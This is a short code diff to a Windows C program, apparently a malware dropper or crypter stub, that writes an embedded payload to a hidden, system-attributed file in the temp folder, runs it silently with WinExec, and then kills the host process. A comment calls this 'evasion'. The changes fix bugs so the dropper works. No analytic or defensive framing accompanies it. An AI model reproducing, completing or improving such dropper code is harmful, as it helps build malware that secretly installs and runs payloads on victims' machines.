@@ -110,14 +110,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			char filename[1024] = "";
 			DWORD byteswritten = 0;
 			GetTempPathA(512,tempspace);
-			sprintf(filename,"%s imanexechangemealready",tempspace); // string replace for a random exe name in C# prog
-			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS,	FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,	NULL);
+			sprintf(filename,"%simanexechangemealready",tempspace); // string replace for a random exe name in C# prog
+			HANDLE tmphnd =  CreateFile(filename,GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
 			NtWriteFile(tmphnd,NULL,NULL,NULL,&blck,payload,rsrc_len,NULL,NULL);
 			
 			CloseHandle(tmphnd);
-			// CreateFile, WriteFile, then SetFileAttributes to hidden and system followed by shellexec or createprocess
 			WinExec(filename,0);
-			TerminateProcess(GetProcessId(),1);
+			TerminateProcess(GetCurrentProcess(),1); // evasiosn done, file executed, now we terminate host app.
 		}
 		break;
         case WM_CLOSE:
